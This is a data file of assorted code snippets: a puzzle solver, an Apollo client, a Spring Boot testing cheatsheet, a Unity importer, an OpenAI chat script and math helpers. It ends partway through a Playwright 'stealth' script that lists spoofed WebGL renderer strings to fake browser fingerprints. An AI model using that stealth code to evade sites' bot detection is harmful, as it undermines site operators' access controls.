name,code
"baguenaudier.cpp
","#include <cstdio>
#include <algorithm>


const int MAX_N = 20;
int n;
bool state[MAX_N];
int count_op = 0;


void print_state()
{
 for (int i = n - 1; i >= 0; i--) {
 printf(""%d"", state[i]);
    }
 printf(""\n"");
}


void flip(int c)
{
    state[c] = !state[c];
 print_state();
    count_op++;
}


void solve(int n);
void rsolve(int n);


// 111 -> 000
void solve(int n)
{
 if (n == 1) {
 flip(0);
    } else if (n == 2) {
 flip(1);
 solve(1);
    } else {
 solve(n - 2);
 flip(n - 1);
 rsolve(n - 2);
 solve(n - 1);
    }
}


// 000 -> 111
void rsolve(int n)
{
 if (n == 1) {
 flip(0);
    } else if (n == 2) {
 rsolve(1);
 flip(1);
    } else {
 rsolve(n - 1);
 solve(n - 2);
 flip(n - 1);
 rsolve(n - 2);
    }
}


int main()
{
 printf(""How many rings?\n"");
 scanf(""%d"", &n);
 std::fill_n(state, n, 1);
 printf(""Solution:\n"");
 print_state();
 solve(n);
 printf(""Steps: %d\n"", count_op);
}
"
"Client.js
","import { ApolloClient, createHttpLink } from ""@apollo/client"";
import { RetryLink } from ""@apollo/client/link/retry"";
import { setContext } from ""@apollo/client/link/context"";
import { onError } from ""@apollo/client/link/error"";
import ApolloCache from ""./Cache"";
import PromiseToObservable from ""./PromiseToObservable"";
import RefreshSession from ""./RefreshSession"";


const httpLink = createHttpLink({
 uri: process.env.NEXT_PUBLIC_APOLLO_CLIENT_HTTP_LINK_URI, // url to your graphql backend
 credentials: ""include"",
});


const serverHttpLink = createHttpLink({
 uri: process.env.APOLLO_CLIENT_HTTP_LINK_URI, // url to your graphql backend that doesn't necessary go back to the internet
 credentials: ""include"",
});




export const ServerClient = new ApolloClient({
 ssrMode: true,
 link: serverHttpLink,
 cache: ApolloCache,
 resolvers: {},
 ssrForceFetchDelay: 100,
 defaultOptions: {
 query: {
 fetchPolicy: ""network-only"",
 },
 },
 connectToDevTools:
 process.env.NEXT_PUBLIC_APOLLO_ENVIRONMENT !== ""production"",
});


const Client = new ApolloClient({
 link: httpLink,
 cache: ApolloCache,
 resolvers: {},
 connectToDevTools:
 process.env.NEXT_PUBLIC_APOLLO_ENVIRONMENT !== ""production"",
});


export default Client;
==<SEPERATOR>==
spring-boot-cheatsheet.java
// Enable component-scanning and auto-configuration with @SpringBootApplication Annotation
// It combines @Configuration + @ComponentScan + @EnableAutoConfiguration
@SpringBootApplication
public class FooApplication {
 public static void main(String[] args) {
 // Bootstrap the application
 SpringApplication.run(FooApplication.class, args);
  }
}


// @Configuration:  Marks a class as a config class using Spring's Java based configuration
// @ComponentScan:  Enables component-scanning so that web controller classes can be
//                  automatically registered as beans in the Spring application context
// @EnableAutoConfiguration: Configures the application based on the dependencies


// Build and Run the application
gradle bootRun
// OR:
gradle build
gradle -jar build/libs/readinglist-0.0.1-SNAPSHOT.jar


// Testing classes in Spring Boot
@RunWith(SpringJUnit4ClassRunner.class)
// Load context via Spring Boot
@SpringApplicationConfiguration(classes = ReadinglistApplication.class)
@WebAppConfiguration
public class ReadinglistApplicationTests {
 // Test that the context successfully loads (the method can be empty -> the test will fail if the context cannot be loaded)
 @Test
 public void contextLoads() {
  }
}


// Make the test methods transactional (here I use Spock as my Test-Framework of choice)
// After each test a rollback is triggered so that the database is in its previous state again
@SpringBootTest
@Transactional
class MySpec extends Specification {
 
 @Autowired
 MyRepository myRepo
 
 def ""Persist an entity""() {
 given:
 MyEntity entity = new MyEntity()
 
 when:
 myRepo.saveAndFlush(entity)
 
 then:
 myRepo.count() == 1
  }
 
 def ""Persist another entity""() {
 given:
 MyEntity entity = new MyEntity()
 
 when:
 myRepo.saveAndFlush(entity)
 
 then:
 myRepo.count() == 1
  }
}


// application.properties is optional
// Configure the embedded tomcat server so listen on port 8081
server.port=8081


// List all libs with its version 
gradle dependencies


// Inject the dependencies in the constructor function of a MVC Controller
// to show the dependent components of the class and to make the testing easier:
// The constructor can be called with an implementing mockup Repository for testing purposes
@Controller
@RequestMapping(""/"")
public class UserController {


 private UserRepository userRepository;


 @Autowired
 public UserController(UserRepository userRepository) {
 this.userRepository = userRepository;
  }
}


// Defining Condition that checks if the JdbcTemplate is available on the classpath
//
// Conditions are used by the auto-configuration mechanism of Spring Boot
// There are several configuration classes in the spring-boot-autoconfigure.jar
// which contribute to the configuration if specific conditions are met
public class JdbcTemplateCondition implements Condition {
 @Override
 public boolean matches(ConditionContext context, AnnotatedTypeMetadata metadata) {
 try {
 context.getClassLoader().loadClass(""org.springframework.jdbc.core.JdbcTemplate"");
 return true;
    } catch (Exception e) {
 return false;
    }
  }
}


// Use a custom condition class to decide whether a Bean should be created or not
@Conditional(JdbcTemplateCondition.class)
public class MyService {
  ...
}


// Overriding Spring Boots auto-configuration for example the Spring Security configuration
// Therefore a specific Configuration class has to be in the classpath
// For Spring Security its the WebSecurityConfigurerAdapter.
// Spring then skips the Spring Security auto-configuration and uses the custom configuration instead.
// This class has to be extended and annotated with @Configuration so that it can be found
// by the component scan and registers it as a bean in the Spring application context.
// In addition there has to be a @EnableWebSecurity annotation for this class to enable Spring Security.


// The list with Auto Configuration classes
spring-boot-autoconfigure.jar -> spring.factories


// Generate report on application startup to the console about what configuration classes are being used
// With a VM parameter
-Ddebug


// OR in the application.properties
debug=true


// Integration test by loading Springs application context
// To to integration testing with Spring, all components of the application have to be configured and wired up.
// Instead of doing this by hand we can use Spring's SpringJUnit4ClassRunner.
// It helps load a Spring application context in JUnit-based application tests.
// This method with the @ContextConfiguration annotation doesn't apply extenal properites (application.properties) and logging
// @ContextConfiguration specifies how to load the application context: A configuraiton class is passed to it as a parameter
@RunWith(SpringJUnit4ClassRunner.class)
@ContextConfiguration(classes=PlaylistConfiguration.class)
public class PlaylistServiceTests {


 @Autowired
 private PlaylistService playlistService;


 @Test
 public void testService() {
 Playlist playlist = playlistService.findByName(""X-Mas Songs"");
 assertEquals(""X-Mas Songs"", playlist.getName());
 assertEquals(12, playlist.countSongs());
  }
}


// Integration test by loading application context + external properties + logging
// Replace the @ContextConfiguration with @SpringApplicationConfiguration
// This loads the application just like the application context would be loaded by using SpringApplication
@RunWith(SpringJUnit4ClassRunner.class)
@SpringApplicationConfiguration(classes=PlaylistConfiguration.class)
public class PlaylistServiceTests {
  ...
}


// Test controller classes
//
// > Either by mocking the servlet container and without starting an application server
// > Or by starting the embedded servlet container (e.g. tomcat) and exercise tests in a real application server


// Test controller classes with Spring's Mock MVC framework
//
// First create a MockMvc Object with the MockMvcBuilders
// standaloneSetup()	- Builds a Mock MVC to serve one ore more manually created controllers
//                  	  so that the controller instances have to be instantiated manually.
//                        It is more like a unit test for very focused tests around a single controller.
// webAppContextSetup() - Builds a Mock MVC using a Spring application context which includes one ore more controllers
//                        using an instance of WebApplicationContext.
//                        Spring will load the controllers as well as their dependencies.
//                        Therefore the test class has to be annotated with @WebAppConfiguration
// 			  to declare that the application context created by the SpringJUnit4ClassRunner
// 			  should be an WebApplicationContext and not the basic non-web ApplicationContext.
//			  The webAppContextSetup() method takes an instance of the WebApplicationContext as a parameter.
@RunWith(SpringJUnit4ClassRunner.class)
@SpringApplicationConfiguration(classes = PlaylistApplication.class)
@WebAppConfiguration
public class MockMvcWebTests {
 @Autowired
 private WebApplicationContext webContext;


 private MockMvc mockMvc;


 @Before
 public void setupMockMvc() {
 mockMvc = MockMvcBuilders
      .webAppContextSetup(webContext)
      .build();
  }


 @Test
 public void playlist() throws Exception {
 mockMvc.perform(MockMvcRequestBuilders.get(""/playlist""))
      .andExpect(MockMvcResultMatchers.status().isOk())
      .andExpect(MockMvcResultMatchers.view().name(""playlist""))
      .andExpect(MockMvcResultMatchers.model().attributeExists(""songs""))
      .andExpect(MockMvcResultMatchers.model().attribute(""songs"",
 Matchers.is(Matchers.empty())));
  }
}


// The playlist() method can be rewritten with static imports
@Test
public void playlist() throws Exception {
 mockMvc.perform(get(""/playlist""))
    .andExpect(status().isOk())
    .andExpect(view().name(""playlist""))
    .andExpect(model().attributeExists(""songs""))
    .andExpect(model().attribute(""songs"", is(empty())));
}


// Test method with HTTP POST request
@Test
public void postSong() throws Exception {
 mockMvc.perform(post(""/playlist""))
    .contentType(MediaType.APPLICATION_FORM_URLENCODED)
    .param(""interpret"", ""OutKast"")
    .param(""title"", ""Hey Ya!"")
    .andExpect(status().is3xxRedirection())
    .andExpect(header().string(""Location"", ""/playlist""));


 // Create expected song
 Song expectedSong = new Song();
 expectedSong.setId(1L);
 expectedSong.setInterpret(""OutKast"");
 expectedSong.setTitle(""Hey Ya!"");


 // Check if new song is in playlist
 mockMvc.perform(get(""/playlist""))
    .andExpect(status().isOk())
    .andExpect(view().name(""playlist""))
    .andExpect(model().attributeExists(""songs""))
    .andExpect(model().attribute(""songs"", hasSize(1)))
    .andExpect(model().attribute(""songs"",
 contains(samePropertyValuesAs(expectedSong))));
}


// Testing with Spring Security
// First add the testCompile dependency
testCompile(""org.springframework.security:spring-security-test"")


// Apply the Spring Security configurer when creating the MockMvc instance
// SecurityMockMvcConfigurers.springSecurity() - returns a Mock MVC configurer that enables Spring Security for Mock MVC
@Before
public void setupMockMvc() {
 mockMvc = MockMvcBuilders
    .webAppContextSetup(webContext)
    .apply(springSecurity())
    .build();
}


// Test without being authenticated
@Test
public void unauthenticated() throws Exception() {
 mockMvc.perform(get(""/""))
    .andExpect(status().is3xxRedirection())
    .andExpect(header().string(""Location"",
 ""http://localhost/login""));
}


// There are two ways to use an authenticated user for the tests
// @WithMockUser - Loads the security with a UserDetails using the given username, password and authorization
// @WithUserDetails - Loads the security context by looking up a UserDetails object for the given username
// This UserDetails object is being used for the duration of the test method


// Bypassing the normal lookup of a UserDetails object and instead create one
@Test
@WithMockUser(
 username=""clark"",
 password=""kent123"",
 roles=""USER""
)
public void authenticatedUser() throws Exception {
  ...
}


// Using a real user from a UserDetailsService
@Test
@WithUserDetails(""clark"")
public void authenticatedUser() throws Exception {
 PlaylistOwner expectedPlaylistOwner = new PlaylistOwner();
 expectedPlaylistOwner.setUsername(""clark"");
 expectedPlaylistOwner.setPassword(""kent123"");
 expectedPlaylistOwner.setFullname(""Clark Kent"");


 mockMvc.perform(get(""/""))
    .andExpect(status().isOk())
    .andExpect(view().name(""playlist""))
    .andExpect(model().attribute(""owner"",
 samePropertyValuesAs(expectedPlaylistOwner)))
    .andExpect(model().attribute(""songs"", hasSize(0)));
}


// Test with a real application server (embedded tomcat)
// @WebIntegrationTest declares that you not only want an application context
// but also to start an embedded servlet container
// You can use Spring's RestTemplate to perform HTTP requests against the application
@RunWith(SpringJUnit4ClassRunner.class)
@SpringApplicationConfiguration(classes = PlaylistApplication.class)
@WebIntegrationTest
public class RealWebTest {


 @Test (expected=HttpClientErrorException.class)
 public void pageNotFound() {
 try {
 RestTemplate rest = new RestTemplate();
 // Perform GET request
 rest.getForObject(""http://localhost:8080/ladida"", String.class);
 fail(""Should result in HTTP 404"");
    } catch (HttpClientErrorException e) {
 assertEquals(HttpStatus.NOT_FOUND, e.getStatusCode());
 throw e;
    }
  }
}


// Start the server an a random port with ""random=true"" and inject actual port value
@RunWith(SpringJUnit4ClassRunner.class)
@SpringApplicationConfiguration(classes = PlaylistApplication.class)
@WebIntegrationTest(randomPort=true)
public class RealWebTest {


 @Value(""${local.server.port}"")
 private int port;


 @Test (expected=HttpClientErrorException.class)
 public void pageNotFound() {
    ...
 rest.getForObject(""http://localhost:{port}/ladida"", String.class, port);
    ...
  }
}


// Test Frontend with Selenium
// First add Selenium as a testCompile dependency
testCompile(""org.seleniumhq.selenium:selenium-java:2.52.0"")


// Write a test class with a FirefoxDriver
@RunWith(SpringJUnit4ClassRunner.class)
@SpringApplicationConfiguration(classes = PlaylistApplication.class)
@WebIntegrationTest(randomPort=true)
public class SeleniumWebTest {


 private static FirefoxDriver browser;


 @Value(""${local.server.port}"")
 private int port;


 @BeforeClass
 public static void openBrowser() {
 browser = new FirefoxDriver();
 browser.manage().timeouts()
      .implicitlyWait(10, TimeUnit.SECONDS);
  }


 @AfterClass
 public static void closeBrowser() {
 browser.quit();
  }


 @Test
 public void addSongToEmptyPlaylist() {
 String baseUrl = ""http://localhost:"" + port;


 browser.get(baseUrl);


 assertEquals(""You have no songs in your playlist"",
 browser.findElementByTagName(""div"").getText());


 browser.findElementByName(""interpret"")
      .sendKeys(""OutKast"");
 browser.findElementByName(""title"")
      .sendKeys(""Hey Ya!"");
 browser.findElementByTagName(""form"")
      .submit();


 WebElement dl = browser.findElementByCssSelector(""dt.songHeadline"");
 assertEquals(""OutKast - Hey Ya!"", dl.getText());


 WebElement dt = browser.findElementByCssSelector(""dd.songTitle"");
 assertEquals(""Hey Ya!"", dt.getText());
  }
}


// Execute Code on Startup (and refresh) of the application
@Component
public class MyListener implements ApplicationListener<ApplicationReadyEvent> {


 @Override
 public void onApplicationEvent(ApplicationReadyEvent event) {
 // doStuff();
  }
}


// Run Flyway migrations on In-Memory DB for an integration test (written in Groovy with Spock)
@SpringBootTest
@AutoConfigureTestDatabase
@ImportAutoConfiguration(FlywayAutoConfiguration.class)
@TestPropertySource(properties = [
 ""flyway.enabled=true"",
 ""spring.jpa.hibernate.ddl-auto=none""
])
class MySpec extends Specification {
 def ""foo""() {
    // do something...
  }
}

// Force a fresh version of the Spring context before each test method executes
@SpringBootTest
@DirtiesContext(classMode = ClassMode.BEFORE_EACH_TEST_METHOD)
class MySpec extends Specification {
  def ""foo""() {
    // do something...
  }
}

// Application events are sent in the following order, as your application runs:
1. ApplicationStartedEvent is sent at the start of a run, but before any processing except the registration of listeners and initializers.
2. ApplicationEnvironmentPreparedEvent is sent when the Environment to be used in the context is known, but before the context is created.
3. ApplicationPreparedEvent is sent just before the refresh is started, but after bean definitions have been loaded.
4. ApplicationReadyEvent is sent after the refresh and any related callbacks have been processed to indicate the application is ready to service requests.
5. ApplicationFailedEvent is sent if there is an exception on startup.
 
// Configure Loglevel from Lombok's @Slf4j Annotation via application.properties
@SpringBootApplication
@Slf4j
public class MyApp {
  public static void main(String[] args) {
    SpringApplication.run(MyApp.class, args);
    log.info(""testing logging with lombok"");
  }
}


// application.properties
logging.level.com.example.MyApp=WARN


// Recommended structuring of a Spring Boot application
com
 +- example
     +- myproject
         +- Application.java
         |
         +- domain // Entities + Repos
         |   +- Customer.java
         |   +- CustomerRepository.java
         |
         +- service
         |   +- CustomerService.java
         |
         +- web
             +- CustomerController.java
 
// Show debug logs from Spring
logging.level.root=debug
==<SEPERATOR>==
ImportAssets.cs
using System.Collections.Generic;
using System.IO;
using UnityEngine;
using UnityEditor;
using UnityEditor.PackageManager.Requests;
using UnityEditor.PackageManager;


// Place this script in YOUR_PROJECT_FOLDER/Assets/Editor
// Run this script by clicking on the Importer menu item below the Unity title bar (File, Edit ... Importer)
public class ImportAssets : EditorWindow {
 static string unityPackagesPath = ""C:/Users/user/Downloads/UnityAssets"";


 static AddRequest Request;
 static int index = 0;


 // Add the packages you want to install here.
 // Package versions and names can be obtained by opening the package manager
 // then clicking on the package you are interested in and clicking on ""view changelog""
 // A browser window will open with a URL similar to the following:
 // https://docs.unity3d.com/Packages/com.unity.2d.animation@5.0/changelog/CHANGELOG.html
 // Obtain the name and the version from the string between Packages/ ... /changelog
 // Omitting the version will install the latest version available.
 // Specific versions can be installed by adding the version after the package name:
 // com.unity.visualeffectgraph@10.2
 // package.name@version
 static List<string> packages = new List<string> {
 ""com.unity.textmeshpro"",
 ""com.unity.shadergraph"",
 ""com.unity.visualeffectgraph"",
 ""com.unity.terrain-tools"",
 ""com.unity.polybrush"",
 ""com.unity.postprocessing"",
 ""com.unity.cinemachine""
 };


 [MenuItem(""Importers/Asset Importer"")]
 public static void ImportAllAssets() {
 string[] unityPackages = Directory.GetFiles(unityPackagesPath);


 for(int i = 0; i < unityPackages.Length; i++) {
 if(unityPackages[i].EndsWith("".unitypackage"")) {
                AssetDatabase.ImportPackage(unityPackages[i], false);
 }
 }


        Debug.Log(""Assets have been imported"");
 }


 // Example of a for loop through methods rather than the for loop built into the language.
 [MenuItem(""Importers/Smart Package Importer"")]
 public static void SmartImportAllPackages() {
 if(index >= packages.Count) { return; }


 Request = Client.Add(packages[index]);
        EditorApplication.update += Progress;


 index++;
 }


 static void Progress() {
 if(Request.IsCompleted) {
 if(Request.Status == StatusCode.Success)
                Debug.Log(""Installed: "" + Request.Result.packageId);
 else if(Request.Status >= StatusCode.Failure)
                Debug.Log(Request.Error.message);


            EditorApplication.update -= Progress;


 if(index >= packages.Count) {
                Complete();
 } else {
                SmartImportAllPackages();
 }
 }
 }


 static void Complete() {
        Debug.Log(""Completed importing all packages."");
 Request = null;
 index = 0;
 }


 [MenuItem(""Importers/Dumb Package Importer"")]
 public static void DumbImportAllPackages() {
 // NOTE: This will freeze the editor. Please wait until the process has completed.
 while(index != packages.Count) {
 Request = Client.Add(packages[index]);


 while(!Request.IsCompleted) {
                System.Threading.Thread.Sleep(2000);
 }


 if(Request.Status == StatusCode.Success)
                Debug.Log(""Installed: "" + Request.Result.packageId);
 else if(Request.Status >= StatusCode.Failure)
                Debug.Log(Request.Error.message);


 index++;
 }


        Complete();
 }
}
"
"UseCase.java
","public sealed interface UseCase {
 interface Result {}


 interface Argument {}


 interface FunctionArgument<R extends Result> extends Argument {}


 non-sealed interface Function<
 A extends FunctionArgument<R>, R extends Result
  >
 extends UseCase, java.util.function.Function<A, R> {}


 non-sealed interface Consumer<A extends Argument>
 extends UseCase, java.util.function.Consumer<A> {}


 non-sealed interface Supplier<R extends Result>
 extends UseCase, java.util.function.Supplier<R> {}


 non-sealed interface Runnable extends UseCase, java.lang.Runnable {}
}
"
"chatgpt.py
","import os
import sys
from dotenv import load_dotenv
import openai # pip install openai
import re


# Load the API key from the .env file
load_dotenv()


# Get the API key from the environment variable
api_key = os.environ.get(""OPENAI_API_KEY"")
org_id = os.environ.get(""OPENAI_ORG_ID"")
model_engine = os.getenv(""MODEL_ENGINE"")


# bail if no API key, org or model engine
#if api_key is None or org_id is None or model_engine is None:
#    print(""Please set the environment variables OPENAI_API_KEY, OPENAI_ORG_ID and MODEL_ENGINE"")
#    sys.exit()


openai.api_key = api_key
openai.organization = org_id


messages = []
system_msg = input(""\n\033[33mWhat type of chatbot would you like to create?\033[0m \n\n> "")
messages.append({""role"": ""system"", ""content"": system_msg})


print(""\n"")


#print(""Say hello to your new assistant!\n"")
user_input = """"
chat_history = ""System: "" + system_msg




while user_input != ""!endchat"": 
 user_input = input(""\033[31mYou: \033[0m"")
 if user_input == ""!endchat"":
 break


 messages.append({""role"": ""user"", ""content"": user_input})
 response = openai.ChatCompletion.create(
 model=model_engine,
 messages=messages)


 reply = response[""choices""][0][""message""][""content""]
 messages.append({""role"": ""assistant"", ""content"": reply})
 chat_history += f""\nUser: {user_input}\nChatGPT: {reply}\n""
 print(""\n\033[31m"" + ""Bot:\033[0m "" + reply + ""\n"")


chat_log = input(""\n\nPlease enter a filename to save the chat log to (without the .log extension): "")
with open(f""{chat_log}.log"", ""w"") as f:
 f.write(re.sub(""\033\[\d+m"", """", chat_history))
==<SEPERATOR>==
capture-and-print-subprocess-output.py
import io
import selectors
import subprocess
import sys


def capture_subprocess_output(subprocess_args):
 # Start subprocess
 # bufsize = 1 means output is line buffered
 # universal_newlines = True is required for line buffering
 process = subprocess.Popen(subprocess_args,
 bufsize=1,
 stdout=subprocess.PIPE,
 stderr=subprocess.STDOUT,
 universal_newlines=True)


 # Create callback function for process output
 buf = io.StringIO()
 def handle_output(stream, mask):
 # Because the process' output is line buffered, there's only ever one
 # line to read when this function is called
 line = stream.readline()
 buf.write(line)
 sys.stdout.write(line)


 # Register callback for an ""available for read"" event from subprocess' stdout stream
 selector = selectors.DefaultSelector()
 selector.register(process.stdout, selectors.EVENT_READ, handle_output)


 # Loop until subprocess is terminated
 while process.poll() is None:
 # Wait for events and handle them with their registered callbacks
 events = selector.select()
 for key, mask in events:
 callback = key.data
 callback(key.fileobj, mask)


 # Get process return code
 return_code = process.wait()
 selector.close()


 success = (return_code == 0)


 # Store buffered output
 output = buf.getvalue()
 buf.close()


 return (success, output)
==<SEPERATOR>==
NormSInv.js
function NormSInv(p) {
 var a1 = -39.6968302866538, a2 = 220.946098424521, a3 = -275.928510446969;
 var a4 = 138.357751867269, a5 = -30.6647980661472, a6 = 2.50662827745924;
 var b1 = -54.4760987982241, b2 = 161.585836858041, b3 = -155.698979859887;
 var b4 = 66.8013118877197, b5 = -13.2806815528857, c1 = -7.78489400243029E-03;
 var c2 = -0.322396458041136, c3 = -2.40075827716184, c4 = -2.54973253934373;
 var c5 = 4.37466414146497, c6 = 2.93816398269878, d1 = 7.78469570904146E-03;
 var d2 = 0.32246712907004, d3 = 2.445134137143, d4 = 3.75440866190742;
 var p_low = 0.02425, p_high = 1 - p_low;
 var q, r;
 var retVal;


 if ((p < 0) || (p > 1))
 {
 alert(""NormSInv: Argument out of range."");
 retVal = 0;
 }
 else if (p < p_low)
 {
 q = Math.sqrt(-2 * Math.log(p));
 retVal = (((((c1 * q + c2) * q + c3) * q + c4) * q + c5) * q + c6) / ((((d1 * q + d2) * q + d3) * q + d4) * q + 1);
 }
 else if (p <= p_high)
 {
 q = p - 0.5;
 r = q * q;
 retVal = (((((a1 * r + a2) * r + a3) * r + a4) * r + a5) * r + a6) * q / (((((b1 * r + b2) * r + b3) * r + b4) * r + b5) * r + 1);
 }
 else
 {
 q = Math.sqrt(-2 * Math.log(1 - p));
 retVal = -(((((c1 * q + c2) * q + c3) * q + c4) * q + c5) * q + c6) / ((((d1 * q + d2) * q + d3) * q + d4) * q + 1);
 }


 return retVal;
}
"
"playwright-stealth.js
","const pw = require('playwright');
const UserAgent = require('user-agents');
const uuid = require('uuid');
const tmp = require('tmp-promise');


const UINT32_MAX = (2 ** 32) - 1;
const WEBGL_RENDERERS = ['ANGLE (NVIDIA Quadro 2000M Direct3D11 vs_5_0 ps_5_0)', 'ANGLE (NVIDIA Quadro K420 Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (NVIDIA Quadro 2000M Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (NVIDIA Quadro K2000M Direct3D11 vs_5_0 ps_5_0)', 'ANGLE (Intel(R) HD Graphics Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (Intel(R) HD Graphics Family Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (ATI Radeon HD 3800 Series Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (Intel(R) HD Graphics 4000 Direct3D11 vs_5_0 ps_5_0)', 'ANGLE (Intel(R) HD Graphics 4000 Direct3D11 vs_5_0 ps_5_0)', 'ANGLE (AMD Radeon R9 200 Series Direct3D11 vs_5_0 ps_5_0)', 'ANGLE (Intel(R) HD Graphics Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (Intel(R) HD Graphics Family Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (Intel(R) HD Graphics Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (Intel(R) HD Graphics Family Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (Intel(R) HD Graphics 4000 Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (Intel(R) HD Graphics 3000 Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (Mobile Intel(R) 4 Series Express Chipset Family Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (Intel(R) G33/G31 Express Chipset Family Direct3D9Ex vs_0_0 ps_2_0)', 'ANGLE (Intel(R) Graphics Media Accelerator 3150 Direct3D9Ex vs_0_0 ps_2_0)', 'ANGLE (Intel(R) G41 Express Chipset Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (NVIDIA GeForce 6150SE nForce 430 Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (Intel(R) HD Graphics 4000)', 'ANGLE (Mobile Intel(R) 965 Express Chipset Family Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (Intel(R) HD Graphics Family)', 'ANGLE (NVIDIA GeForce GTX 760 Direct3D11 vs_5_0 ps_5_0)', 'ANGLE (NVIDIA GeForce GTX 760 Direct3D11 vs_5_0 ps_5_0)', 'ANGLE (NVIDIA GeForce GTX 760 Direct3D11 vs_5_0 ps_5_0)', 'ANGLE (AMD Radeon HD 6310 Graphics Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (Intel(R) Graphics Media Accelerator 3600 Series Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (Intel(R) G33/G31 Express Chipset Family Direct3D9 vs_0_0 ps_2_0)', 'ANGLE (AMD Radeon HD 6320 Graphics Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (Intel(R) G33/G31 Express Chipset Family (Microsoft Corporation - WDDM 1.0) Direct3D9Ex vs_0_0 ps_2_0)', 'ANGLE (Intel(R) G41 Express Chipset)', 'ANGLE (ATI Mobility Radeon HD 5470 Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (Intel(R) Q45/Q43 Express Chipset Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (NVIDIA GeForce 310M Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (Intel(R) G41 Express Chipset Direct3D9 vs_3_0 ps_3_0)', 'ANGLE (Mobile Intel(R) 45 Express Chipset Family (Microsoft Corporation - WDDM 1.1) Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (NVIDIA GeForce GT 440 Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (ATI Radeon HD 4300/4500 Series Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (AMD Radeon HD 7310 Graphics Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (Intel(R) HD Graphics)', 'ANGLE (Intel(R) 4 Series Internal Chipset Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (AMD Radeon(TM) HD 6480G Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (ATI Radeon HD 3200 Graphics Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (AMD Radeon HD 7800 Series Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (Intel(R) G41 Express Chipset (Microsoft Corporation - WDDM 1.1) Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (NVIDIA GeForce 210 Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (NVIDIA GeForce GT 630 Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (AMD Radeon HD 7340 Graphics Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (Intel(R) 82945G Express Chipset Family Direct3D9 vs_0_0 ps_2_0)', 'ANGLE (NVIDIA GeForce GT 430 Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (NVIDIA GeForce 7025 / NVIDIA nForce 630a Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (Intel(R) Q35 Express Chipset Family Direct3D9Ex vs_0_0 ps_2_0)', 'ANGLE (Intel(R) HD Graphics 4600 Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (AMD Radeon HD 7520G Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (AMD 760G (Microsoft Corporation WDDM 1.1) Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (NVIDIA GeForce GT 220 Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (NVIDIA GeForce 9500 GT Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (Intel(R) HD Graphics Family Direct3D9 vs_3_0 ps_3_0)', 'ANGLE (Intel(R) Graphics Media Accelerator HD Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (NVIDIA GeForce 9800 GT Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (Intel(R) Q965/Q963 Express Chipset Family (Microsoft Corporation - WDDM 1.0) Direct3D9Ex vs_0_0 ps_2_0)', 'ANGLE (NVIDIA GeForce GTX 550 Ti Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (Intel(R) Q965/Q963 Express Chipset Family Direct3D9Ex vs_0_0 ps_2_0)', 'ANGLE (AMD M880G with ATI Mobility Radeon HD 4250 Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (NVIDIA GeForce GTX 650 Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (ATI Mobility Radeon HD 5650 Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (ATI Radeon HD 4200 Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (AMD Radeon HD 7700 Series Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (Intel(R) G33/G31 Express Chipset Family)', 'ANGLE (Intel(R) 82945G Express Chipset Family Direct3D9Ex vs_0_0 ps_2_0)', 'ANGLE (SiS Mirage 3 Graphics Direct3D9Ex vs_2_0 ps_2_0)', 'ANGLE (NVIDIA GeForce GT 430)', 'ANGLE (AMD RADEON HD 6450 Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (ATI Radeon 3000 Graphics Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (Intel(R) 4 Series Internal Chipset Direct3D9 vs_3_0 ps_3_0)', 'ANGLE (Intel(R) Q35 Express Chipset Family (Microsoft Corporation - WDDM 1.0) Direct3D9Ex vs_0_0 ps_2_0)', 'ANGLE (NVIDIA GeForce GT 220 Direct3D9 vs_3_0 ps_3_0)', 'ANGLE (AMD Radeon HD 7640G Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (AMD 760G Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (AMD Radeon HD 6450 Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (NVIDIA GeForce GT 640 Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (NVIDIA GeForce 9200 Direct3D9Ex vs_3_0 